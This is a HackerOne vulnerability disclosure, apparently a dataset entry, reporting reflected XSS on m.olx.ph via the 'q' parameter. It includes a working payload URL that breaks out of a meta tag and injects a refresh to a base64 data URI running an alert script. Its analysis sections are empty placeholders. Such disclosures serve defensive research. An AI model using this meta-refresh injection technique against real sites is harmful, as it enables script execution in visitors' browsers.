---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '157813'
original_report_id: '157813'
title: XSS on Meta Tag at https://m.olx.ph
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-08-09T10:04:09.787Z'
disclosed_at: '2017-01-20T09:25:27.796Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS on Meta Tag at https://m.olx.ph

## Metadata

- HackerOne Report ID: 157813
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2017-01-20T09:25:27.796Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

There is improper validation at q parameter on https://m.olx.ph/ where it can be manipulated by an attacker to include his/her XSS payload to execute javascript code.

As example:

``https://m.olx.ph/all-results?q=0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg" HTTP-EQUIV="refresh" a="a``

Where once opened the above URL, once refreshed, a Javascript popup will appear.
This is because, from the XSS payload used, the Meta tag was properly closed with " character and then it was supplied with a redirect script which already encoded in Base64 format. Where if decoded, it is actually 
``<script>alert('test3')</script>``

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
